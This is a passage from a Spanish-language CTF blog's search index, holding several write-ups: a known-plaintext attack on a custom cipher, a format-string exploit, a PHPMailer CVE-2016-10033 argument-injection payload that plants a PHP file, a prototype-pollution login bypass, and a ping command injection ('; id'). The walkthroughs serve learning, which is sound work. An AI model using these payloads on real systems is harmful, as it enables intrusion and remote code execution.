enc_block+=bytes([val]) returnenc_block defencrypt(msg, password): h=sha256(password).digest() iflen(msg) %BLOCK_SIZE!=0: msg=pad(msg, BLOCK_SIZE) blocks=[msg[i:i+BLOCK_SIZE] foriinrange(0, len(msg), BLOCK_SIZE)] ct=b'' forblockinblocks: enc_block=encrypt_block(block, h) h=sha256(enc_block+block).digest() ct+=enc_block returnct.hex() defrun_command(cmd): ifcmdinallowed_commands: try: resp=subprocess.run( cmd.decode().split(' '), capture_output=True) output=resp.stdout returnoutput except: returnb'Something went wrong!\\n' else: returnb'Invalid command!\\n' defchallenge(req): req.sendall(b'This is Jenny! I am the heart and soul of this spaceship.\\n'+ b'Welcome to the debug terminal. For security purposes I will encrypt any responses.') whileTrue: req.sendall(b'\\n\u0026gt; ') command=req.recv(4096).strip() output=run_command(command) response=b'Command executed: '+command+b'\\n'+output password=os.urandom(32) ct=encrypt(response, password) req.sendall(ct.encode()) classincoming(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(30) req=self.request challenge(req) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defmain(): socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if__name__==\"__main__\": main()  Este código ejecuta un servidor que nos permite ejecutar comandos de sistema: whoami, ls, cat secret.txt or pwd. Sin embargo, la salida del comando y un mensaje de información se cifra con estas funciones, en bloques de 32 bytes:\ndefencrypt_block(block, secret): enc_block=b'' foriinrange(BLOCK_SIZE): val=(block[i]+secret[i]) %256 enc_block+=bytes([val]) returnenc_block defencrypt(msg, password): h=sha256(password).digest() iflen(msg) %BLOCK_SIZE!=0: msg=pad(msg, BLOCK_SIZE) blocks=[msg[i:i+BLOCK_SIZE] foriinrange(0, len(msg), BLOCK_SIZE)] ct=b'' forblockinblocks: enc_block=encrypt_block(block, h) h=sha256(enc_block+block).digest() ct+=enc_block returnct.hex()  La cosa es que \u0026quot;Command executed: cat secret.txt\u0026quot; es una cadena de 32 bytes, por lo que podemos realizar un ataque de texto claro conocido:\n$ nc 178.62.23.240 30410 This is Jenny! I am the heart and soul of this spaceship. Welcome to the debug terminal. For security purposes I will encrypt any responses. \u0026gt; cat secret.txt 5b091883b5808f1feb09b9016a7c7e017511fd0b2593d78bbbda209866c7c4169512e84002c2e3ac7e832ffe996c849dd9604cea72e2d356626d7035b1e17c4c2bcf2f4a5473d6fd9118285ef447e59b1bf285ea6e9abfcc346c9be2b4a2edd68945681a2f94bb15006e1b1750f94c587410321c354c79f17511afbd2a0ace5156f5a11eee7203bd2f75ab5f604a2f03ea53aa2061aa61738c6dc63d3462d448daf150c44f4ef0dad081470ce61873b64f18adb3c8925cf3d03268b03de27db53674dfe6bd2fbf39bb00a8e4f67a0e643a6d2181cedba1b2a2ee7d851b0ab6ea344221047f06fbe43f9497c1dec632ec02940a885a114ed81b6bf81d0f5ed42d  Además, la primera clave es password = os.urandom(32), y luego, el bloque anterior se usa para construir la clave para el siguiente bloque (usando un hash SHA256). Por tanto, como conocemos 32 bytes de texto claro, sabemos que su hash SHA256 es la clave para el siguiente bloque.\nEntonces, podemos descifrar el siguiente bloque usando el hash SHA256 del bloque anterior, e inductivamente, descifrar todos los bloques así:\ndefmain(): p= get_process() p.sendlineafter(b'\u0026gt; ', b'cat secret.txt') ct=bytes.fromhex(p.recvline().strip().decode()) block=b'Command executed: cat secret.txt' secret=block i=0 whileb'}'notinsecret: h=sha256(ct[32*i: 32*(i+1)] +block).digest() block=decrypt_block(ct[32*(i+1) : 32*(i+2)], h) secret+=block i+=1 print(secret.decode()) p.close()  Y esta es la función de descifrado (función inversa del cifrado):\ndefdecrypt_block(enc_block, plaintext): dec_block=b'' foriinrange(BLOCK_SIZE): val=(enc_block[i] -plaintext[i]) %256 dec_block+=bytes([val]) returndec_block  Usando este script: solve.py podemos obtener la flag:\n$ python3 solve.py 178.62.23.240:30410 [+] Opening connection to 178.62.23.240 on port 30410: Done Command executed: cat secret.txt In case Jenny malfunctions say the following phrase: Melt My Eyez, See Your Future The AI system will shutdown and you will gain complete control of the spaceship. - Danbeer S.A. HTB{th1s_b451c_b107k_c1ph3r_1s_n0t_s@fe} [*] Closed connection to 178.62.23.240 port 30410  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/jenny-from-the-block/","section":"ctf","summary":"Cifrado en bloque. Ataque de texto claro conocido. Inducción. SHA256","time":1,"title":"Jenny From The Block"},{"contents":"Se nos proporciona un servicio que consiste en un sistema de apuestas. Tenemos que apostar una cierta cantidad de dinero y luego adivinar un número entre 1 y 10 en menos de 10 intentos. Por ejemplo:\n$ nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : y Money you have : 500$ Place a Bet : 500 Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : 3 Computer's number : 7 Your Guess : 3 Sorry Wrong Guess, Try Again !. -_- Make a Guess : 3 Computer's number : 3 Your Guess : 3 Sorry Wrong Guess, Try Again !. -_- You made it !. You won JACKPOT !.. You thought of what computer thought !. Your balance has been updated ! Current balance : 1500$ Want to play again? Y/N : n Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  En cambio, si perdemos la apuesta, nuestro balance de dinero disminuirá:\n$ python3 -c 'print(\"y\\n500\\n\" + \"0\\n\" * 10 + \"n\")' | nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : Money you have : 500$ Place a Bet : Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : Computer's number : 7 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 4 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 9 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 5 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Sorry you didn't made it ! Play Again !... Better Luck next Time !. Sorry you lost some money !.. Your balance has been updated !. Current balance :  : 0$ Want to play again? Y/N : Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  El objetivo es tener más de 1000000. La clave aquí es que podemos apostar números negativos, y si perdemos, nuestro balance será nuestro dinero actual menos la apuesta, por lo que podemos apostar un número negativo como - 1000000 y perder el juego, de manera que terminemos teniendo 1000500:\n$ python3 -c 'print(\"y\\n-1000000\\n\" + \"0\\n\" * 10 + \"n\")' | nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of ! (4) computer's number changes every new time !. (5) You have to guess a number between 1-10 (6) You have only 10 tries !. (7) If you guess a number  10, it still counts as a Try ! (8) Put your mind, Win the game !.. (9) If you guess within the number of tries, you win money ! (10) Good Luck !.. theKidOfArcrania: I bet you cannot get past $1000000! Are you ready? Y/N : Money you have : 500$ Place a Bet : Loading : ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 100% The Game is On, Good Luck !.. Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 1 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 4 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 8 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 1 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 3 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 2 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 6 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Make a Guess : Computer's number : 7 Your Guess : 0 Sorry Wrong Guess, Try Again !. -_- Sorry you didn't made it ! Play Again !... Better Luck next Time !. Sorry you lost some money !.. Your balance has been updated !. Current balance :  : 1000500$ What the... how did you get that money (even when I tried to stop you)!? I guess you beat me! The flag is CTFlearn{d9029a08c55b936cbc9a30_i_wish_real_betting_games_were_like_this!} Thank you for playing ! Made by John_123 Small mods by theKidOfArcrania Give it a (+1) if you like !..  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/lazy-game-challenge/","section":"ctf","summary":"Operaciones con números enteros","time":5,"title":"Lazy Game Challenge"},{"contents":"Se nos proporciona un binario de 64 bits llamado leet_test:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Si lo abrimos en Ghidra, veremos el siguiente código descompilado en C:\nuintwinner =0xcafebabe; voidmain() { longin_FS_OFFSET; uintrandom; inturandom_fd; intflag_fd; void*flag; charname[280]; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); initialize(); urandom_fd =open(\"/dev/urandom\", 0); read(urandom_fd, \u0026amp;random, 4); close(urandom_fd); random =random \u0026amp;0xffff; while(true) { printf(\"Welcome to HTB!\\nPlease enter your name: \"); fgets(name, 256, stdin); printf(\"Hello, \"); printf(name); if(random *0x1337c0de==winner) break; puts(\"Sorry! You aren\\'t 1337 enough :(\\nPlease come back later\\n------------------------\"); } flag_fd =open(\"flag.txt\", 0); flag =malloc(256); read(flag_fd, flag, 256); close(flag_fd); printf(\"\\nCome right in! %s\\n\", flag); /* WARNING: Subroutine does not return */ exit(0); }  Aquí tenemos una vulnerabilidad de Format String, ya que hay una llamada a printf usando como primer argumento una variable controlada por el usuario. Entonces, podemos introducir formatos y potencialmente extraer valores de la pila (stack) y también escribir en direcciones de memoria arbitrarias. Vamos a probar:\n$ ./leet_test Welcome to HTB! Please enter your name: %lx Hello, 7ffcc59f23e0 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx Hello, 7ffcc59f23e0.0.0.7.7.0.9e5900000240.34000000003.58000000380.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9000a786c25.98000000980 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  Vemos que %lx se ha reemplazado por un número hexadecimal (7ffcc59f23e0). Esto es una dirección de memoria de la pila. De hecho, si metemos un montón de %lx, veremos que nuestra cadena de texto también se almacena en la pila. La encontramos a partir de la posición 10 (2e786c252e786c25 es %lx.%lx. en formato bytes, little-endian).\nEntonces, podemos leer valores de la pila usando una notación distinta. Y así, podemos controlar los valores a partir del offset 10:\n$ ./leet_test Welcome to HTB! Please enter your name: AAAABBBB.%10$lx Hello, AAAABBBB.4242424241414141 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %11$lx..AAAABBBB Hello, 4242424241414141..AAAABBBB Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  El objetivo de este reto es pasar la comprobación de que random * 0x1337c0de == winner. Primero, sería útil conocer el valor de random, que se calcula al inicio. Vamos a usar GDB para encontrarlo:\n$ gdb -q leet_test Reading symbols from leet_test... (No debugging symbols found in leet_test) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004012ca \u0026lt;+0\u0026gt;: endbr64 0x00000000004012ce \u0026lt;+4\u0026gt;: push rbp 0x00000000004012cf \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000004012d2 \u0026lt;+8\u0026gt;: sub rsp,0x140 0x00000000004012d9 \u0026lt;+15\u0026gt;: mov rax,QWORD PTR fs:0x28 0x00000000004012e2 \u0026lt;+24\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x00000000004012e6 \u0026lt;+28\u0026gt;: xor eax,eax 0x00000000004012e8 \u0026lt;+30\u0026gt;: mov eax,0x0 0x00000000004012ed \u0026lt;+35\u0026gt;: call 0x401256 \u0026lt;initialize\u0026gt; 0x00000000004012f2 \u0026lt;+40\u0026gt;: mov esi,0x0 0x00000000004012f7 \u0026lt;+45\u0026gt;: lea rdi,[rip+0xd0a] # 0x402008 0x00000000004012fe \u0026lt;+52\u0026gt;: mov eax,0x0 0x0000000000401303 \u0026lt;+57\u0026gt;: call 0x401150 \u0026lt;open@plt\u0026gt; 0x0000000000401308 \u0026lt;+62\u0026gt;: mov DWORD PTR [rbp-0x130],eax 0x000000000040130e \u0026lt;+68\u0026gt;: lea rcx,[rbp-0x134] 0x0000000000401315 \u0026lt;+75\u0026gt;: mov eax,DWORD PTR [rbp-0x130] 0x000000000040131b \u0026lt;+81\u0026gt;: mov edx,0x4 0x0000000000401320 \u0026lt;+86\u0026gt;: mov rsi,rcx 0x0000000000401323 \u0026lt;+89\u0026gt;: mov edi,eax 0x0000000000401325 \u0026lt;+91\u0026gt;: mov eax,0x0 0x000000000040132a \u0026lt;+96\u0026gt;: call 0x401110 \u0026lt;read@plt\u0026gt; 0x000000000040132f \u0026lt;+101\u0026gt;: mov eax,DWORD PTR [rbp-0x130] 0x0000000000401335 \u0026lt;+107\u0026gt;: mov edi,eax 0x0000000000401337 \u0026lt;+109\u0026gt;: mov eax,0x0 0x000000000040133c \u0026lt;+114\u0026gt;: call 0x401100 \u0026lt;close@plt\u0026gt; 0x0000000000401341 \u0026lt;+119\u0026gt;: mov eax,DWORD PTR [rbp-0x134] 0x0000000000401347 \u0026lt;+125\u0026gt;: movzx eax,ax 0x000000000040134a \u0026lt;+128\u0026gt;: mov DWORD PTR [rbp-0x134],eax 0x0000000000401350 \u0026lt;+134\u0026gt;: lea rdi,[rip+0xcc1] # 0x402018 0x0000000000401357 \u0026lt;+141\u0026gt;: mov eax,0x0 0x000000000040135c \u0026lt;+146\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x0000000000401361 \u0026lt;+151\u0026gt;: mov rdx,QWORD PTR [rip+0x2d28] # 0x404090 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000401368 \u0026lt;+158\u0026gt;: lea rax,[rbp-0x120] 0x000000000040136f \u0026lt;+165\u0026gt;: mov esi,0x100 0x0000000000401374 \u0026lt;+170\u0026gt;: mov rdi,rax 0x0000000000401377 \u0026lt;+173\u0026gt;: call 0x401120 \u0026lt;fgets@plt\u0026gt; 0x000000000040137c \u0026lt;+178\u0026gt;: lea rdi,[rip+0xcbe] # 0x402041 0x0000000000401383 \u0026lt;+185\u0026gt;: mov eax,0x0 0x0000000000401388 \u0026lt;+190\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x000000000040138d \u0026lt;+195\u0026gt;: lea rax,[rbp-0x120] 0x0000000000401394 \u0026lt;+202\u0026gt;: mov rdi,rax 0x0000000000401397 \u0026lt;+205\u0026gt;: mov eax,0x0 0x000000000040139c \u0026lt;+210\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x00000000004013a1 \u0026lt;+215\u0026gt;: mov eax,DWORD PTR [rbp-0x134] 0x00000000004013a7 \u0026lt;+221\u0026gt;: imul edx,eax,0x1337c0de 0x00000000004013ad \u0026lt;+227\u0026gt;: mov eax,DWORD PTR [rip+0x2cc5] # 0x404078 \u0026lt;winner\u0026gt; 0x00000000004013b3 \u0026lt;+233\u0026gt;: cmp edx,eax 0x00000000004013b5 \u0026lt;+235\u0026gt;: jne 0x4013be \u0026lt;main+244\u0026gt; 0x00000000004013b7 \u0026lt;+237\u0026gt;: mov eax,0x1 0x00000000004013bc \u0026lt;+242\u0026gt;: jmp 0x4013c3 \u0026lt;main+249\u0026gt; 0x00000000004013be \u0026lt;+244\u0026gt;: mov eax,0x0 0x00000000004013c3 \u0026lt;+249\u0026gt;: test al,al 0x00000000004013c5 \u0026lt;+251\u0026gt;: je 0x401450 \u0026lt;main+390\u0026gt; 0x00000000004013cb \u0026lt;+257\u0026gt;: mov esi,0x0 0x00000000004013d0 \u0026lt;+262\u0026gt;: lea rdi,[rip+0xc72] # 0x402049 0x00000000004013d7 \u0026lt;+269\u0026gt;: mov eax,0x0 0x00000000004013dc \u0026lt;+274\u0026gt;: call 0x401150 \u0026lt;open@plt\u0026gt; 0x00000000004013e1 \u0026lt;+279\u0026gt;: mov DWORD PTR [rbp-0x12c],eax 0x00000000004013e7 \u0026lt;+285\u0026gt;: mov edi,0x100 0x00000000004013ec \u0026lt;+290\u0026gt;: call 0x401130 \u0026lt;malloc@plt\u0026gt; 0x00000000004013f1 \u0026lt;+295\u0026gt;: mov QWORD PTR [rbp-0x128],rax 0x00000000004013f8 \u0026lt;+302\u0026gt;: mov rcx,QWORD PTR [rbp-0x128] 0x00000000004013ff \u0026lt;+309\u0026gt;: mov eax,DWORD PTR [rbp-0x12c] 0x0000000000401405 \u0026lt;+315\u0026gt;: mov edx,0x100 0x000000000040140a \u0026lt;+320\u0026gt;: mov rsi,rcx 0x000000000040140d \u0026lt;+323\u0026gt;: mov edi,eax 0x000000000040140f \u0026lt;+325\u0026gt;: mov eax,0x0 0x0000000000401414 \u0026lt;+330\u0026gt;: call 0x401110 \u0026lt;read@plt\u0026gt; 0x0000000000401419 \u0026lt;+335\u0026gt;: mov eax,DWORD PTR [rbp-0x12c] 0x000000000040141f \u0026lt;+341\u0026gt;: mov edi,eax 0x0000000000401421 \u0026lt;+343\u0026gt;: mov eax,0x0 0x0000000000401426 \u0026lt;+348\u0026gt;: call 0x401100 \u0026lt;close@plt\u0026gt; 0x000000000040142b \u0026lt;+353\u0026gt;: mov rax,QWORD PTR [rbp-0x128] 0x0000000000401432 \u0026lt;+360\u0026gt;: mov rsi,rax 0x0000000000401435 \u0026lt;+363\u0026gt;: lea rdi,[rip+0xc16] # 0x402052 0x000000000040143c \u0026lt;+370\u0026gt;: mov eax,0x0 0x0000000000401441 \u0026lt;+375\u0026gt;: call 0x4010e0 \u0026lt;printf@plt\u0026gt; 0x0000000000401446 \u0026lt;+380\u0026gt;: mov edi,0x0 0x000000000040144b \u0026lt;+385\u0026gt;: call 0x401160 \u0026lt;exit@plt\u0026gt; 0x0000000000401450 \u0026lt;+390\u0026gt;: lea rdi,[rip+0xc11] # 0x402068 0x0000000000401457 \u0026lt;+397\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x000000000040145c \u0026lt;+402\u0026gt;: jmp 0x401350 \u0026lt;main+134\u0026gt; End of assembler dump. gef➤ break *main+221 Breakpoint 1 at 0x4013a7 gef➤ run Starting program: ./leet_test Welcome to HTB! Please enter your name: %lx Hello, 7fffffffbe90 Breakpoint 1, 0x00000000004013a7 in main ()  gef➤ x/i $rip =\u0026gt; 0x4013a7 \u0026lt;main+221\u0026gt;: imul edx,eax,0x1337c0de gef➤ p/x $rax $1 = 0x15c0  gef➤ x/20gx $rsp 0x7fffffffe530: 0x0000000000000000 0x000015c000000240 0x7fffffffe540: 0x0000034000000003 0x0000058000000380 0x7fffffffe550: 0x000009000a786c25 0x0000098000000980 0x7fffffffe560: 0x0000098000000980 0x0000098000000980 0x7fffffffe570: 0x0000098000000980 0x0000098000000980 0x7fffffffe580: 0x0000098000000980 0x0000098000000980 0x7fffffffe590: 0x0000098000000980 0x0000098000000980 0x7fffffffe5a0: 0x0000098000000980 0x0000098000000980 0x7fffffffe5b0: 0x0000000000000000 0x0000000000000100 0x7fffffffe5c0: 0x0000004000000000 0x0000040000000200 gef➤ grep %lx [+] Searching '%lx' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe550 - 0x7fffffffe555 → \"%lx\\n\"  gef➤ c Continuing. Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: %7$lx Hello, 15c000000240 Breakpoint 1, 0x00000000004013a7 in main ()  Genial, ahora tenemos el offset en el que se encuentra el valor random (2 bytes superiores):\n$ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, 3d8300000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C $ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, f59700000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C $ ./leet_test Welcome to HTB! Please enter your name: %7$lx Hello, 73200000240 Sorry! You aren't 1337 enough :( Please come back later ------------------------ Welcome to HTB! Please enter your name: ^C  En este punto, sabremos cuál es el resultado de random * 0x1337c0de. Sin embargo, no será 0xcafebabe (que es el valor de winner). Entonces, ¿qué podemos hacer? Bueno, las vulnerabilidades de Format String también nos permiten escribir datos en direcciones de memoria arbitrarias usando %n. La manera en la que funciona este formato es que almacena el número de bytes impresos hasta el formato (%n) en la dirección a la que apunta el formato.\nComo podemos controlar la pila a partir del offset 10, podemos poner aquí una dirección en la que queremos escribir. La dirección de winner es conocida (0x404078), ya que el binario no tiene PIE:\n$ readelf -s leet_test | grep winner 72: 0000000000404078 4 OBJECT GLOBAL DEFAULT 25 winner  Para escribir grandes cantidades de datos, se puede usar %c. Entonces, la idea es:\n Fugar el valor de random Calcular random * 0x1337c0de Modificar el valor de winner según corresponda  Más información acerca de explotación de Format String aparece en mi write-up de Format, en mi write-up de Space Pirate: Entrypoint o en mi write-up de Rope. También es recomendable ver vídeos de YouTube de LiveOverflow, que son geniales:\nLa explotación manual de Format String para escribir valores puede ser muy tediosa, pero pwntools nos ayuda con una función llamada fmtstr_payload, que toma el offset desde donde controlamos nuestra format string y un diccionario que mapea la dirección donde queremos escribir con el valor que queremos escribir. Con esto, podemos completar los pasos anteriores y obtener la flag:\n$ python3 solve.py 138.68.162.164:32700 [*] './leet_test' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to 138.68.162.164 on port 32700: Done b'HTB{y0u_sur3_r_1337_en0ugh!!}\\n' [*] Closed connection to 138.68.162.164 port 32700  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/leet-test/","section":"ctf","summary":"Binario de 64 bits. Vulnerabilidad de Format String","time":5,"title":"Leet Test"},{"contents":"Se nos proporciona la siguiente página web:\nMuestra un listado de directorio. Si vamos a /mailer.php veremos esta página para enviar correos:\nEl archivo mailer.zip contiene el código fuente de mailer.php. Es bastante largo como para ponerlo aquí.\nLa clave está en que utiliza PHPMailer, que es vulnerable a CVE-2016-10033 y CVE-2016-10045. De hecho, existen exploits públicos como el que aparece en www.exploit-db.com.\nBásicamente, el exploit dice que pongamos este payload como nuestro correo:\n\"attacker\\\" -oQ/tmp/ -X/var/www/html/phpcode.php some \"@email.com  Y luego poner código PHP en la lista de correos. Por ejemplo, podemos tratar de cargar phpinfo():\nY de hecho, habremos creado un archivo llamado phpcode.php con phpinfo() dentro:\nEs momento de conseguir ejecución remota de comandos:\nY ahora podemos buscar la flag y capturarla:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/letter-dispair/","section":"ctf","summary":"PHP. Ejecución remota de comandos. PHPMailer (CVE)","time":0,"title":"Letter Dispair"},{"contents":"Tenemos que iniciar sesión aquí: http://puzzler7.imaginaryctf.org:5001/:\nSi inspeccionamos el código HTML de la página, veremos un comentario que apunta a /source:\nAhora tenemos el código fuente del servidor:\nconstexpress=require('express') constcrypto=require('crypto') functionmd5(text) { returncrypto.createHash('md5').update(text).digest('hex') } constapp=express() constusers={ guest: '084e0343a0486ff05530df6c705c8bb4', admin: '21232f297a57a5a743894a0e4a801fc3', '1337hacker': '2ab96390c7dbe3439de74d0c9b0b1767' } constlocalIPs=['127.0.0.1', '::1', '::ffff:127.0.0.1'] app.use(express.urlencoded({ extended: false})) app.use(express.json()) app.get('/', (req, res) =\u0026gt;{ res.send(` \u0026lt;form action=\"/login\" method=\"POST\"\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\"username\"\u0026gt;Username: \u0026lt;/label\u0026gt; \u0026lt;input name=\"username\" type=\"text\" id=\"username\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\"password\"\u0026gt;Password: \u0026lt;/label\u0026gt; \u0026lt;input name=\"password\" type=\"password\" id=\"password\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\"submit\"\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- /source --\u0026gt; `) }) app.post('/login', (req, res) =\u0026gt;{ if(req.body.username ==='admin'\u0026amp;\u0026amp;!localIPs.includes(req.ip)) { returnres.end('Admin is only allowed from localhost') } constauth=Object.assign({}, req.body) if(users[auth.username] ===md5(auth.password)) { if(auth.username ==='admin') { res.end(`Welcome admin! The flag is ${process.env.FLAG}`) } else{ res.end(`Welcome ${auth.username}!`) } } else{ res.end('Invalid username or password') } }) app.get('/source', (req, res) =\u0026gt;{ res.sendFile(__filename) }) app.get('/package.json', (req, res) =\u0026gt;{ res.sendFile('package.json', { root: __dirname}) }) constport=5001||process.env.PORT app.listen(port, () =\u0026gt;{ console.log(`Server running on http://localhost:${port}`) })  Se trata de una página web realizada en Express JS, en JavaScript (Node.js).\nVemos que las contraseñas se comprueban con MD5 con hashes hard-coded. Nos gustaría entrar como admin, cuyo hash de contraseña es 21232f297a57a5a743894a0e4a801fc3. Si lo metemos en crackstation.net, veremos que la contraseña también es admin:\nPero no podemos conseguir la flag así porque nuestra IP no es 127.0.0.1:\n$ curl puzzler7.imaginaryctf.org:5001/login -d '{\"username\":\"admin\",\"password\":\"admin\"}' -H 'Content-Type: application/json' Admin is only allowed from localhost  Sin embargo, después de esa comprobación, hay una llamada a Object.assign({}, req.body). Aquí tenemos una vulnerabilidad de Prototype Pollution, por lo que podemos añadir propiedades por defecto a todos los objetos (más información en security.snyk.io).\nPara pasar la comprobación del if, podemos obviar los campos de username y password, y ponerlos como prototype para todos los objetos así:\n$ curl puzzler7.imaginaryctf.org:5001/login -d '{\"__proto__\":{\"username\":\"admin\",\"password\":\"admin\"}}' -H 'Content-Type: application/json' Welcome admin! The flag is ictf{omg_js_why_are_you_doing_this_to_me}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/login-please/","section":"ctf","summary":"ImaginaryCTF 12/09/2022. 75 puntos. Hash MD5. Prototype Pollution","time":1,"title":"Login Please"},{"contents":"Se nos proporciona un archivo de texto grande llamado anthem.flag.txt:\n$ wc -l anthem.flag.txt 2146 anthem.flag.txt  2146 son muchas líneas para buscar la flag a ojo. En su lugar, podemos usar grep para encontrar la flag, ya que tienen un formato común (picoCTF{...}):\n$ grep picoCTF anthem.flag.txt we think that the men of picoCTF{gr3p_15_@w3s0m3_4c479940}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/lookey-here/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Búsqueda por patrón","time":0,"title":"Lookey here"},{"contents":"Se nos proporciona esta página web:\nLa funcionalidad que tiene es usar el comando ping:\nEl problema puede estar relacionado con inyección de comandos, porque probablemente el servidor hace algo como:\n\u0026lt;?php $cmd ='ping -c 4 '.$_POST['ip_address']; system($cmd);  A lo mejor no en PHP, pero el concepto es el mismo. Por tanto, podemos probar a poner un punto y coma e inyectar otro comando de sistema (; id):\nAhí está, el servidor es vulnerable a inyección de comandos, que deriva en ejecución remota de comandos (RCE). Vamos a buscar el archivo de la flag (; find / -name flag\\* 2\u0026gt;/dev/null):\nGenial, ahora podemos usar ; cat /flag_oZgiV (o también ; cat /flag*):\nY la flag es: HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/looking-glass/","section":"ctf","summary":"Inyección de comandos. Ejecución remota de comandos","time":0,"title":"looking glass"},{"contents":"Se nos proporciona un archivo ZIP llamado flag.zip que contiene una imagen JPEG y también un archivo llamado .DS_Store, que es un archivo temporal que aparece en máquinas 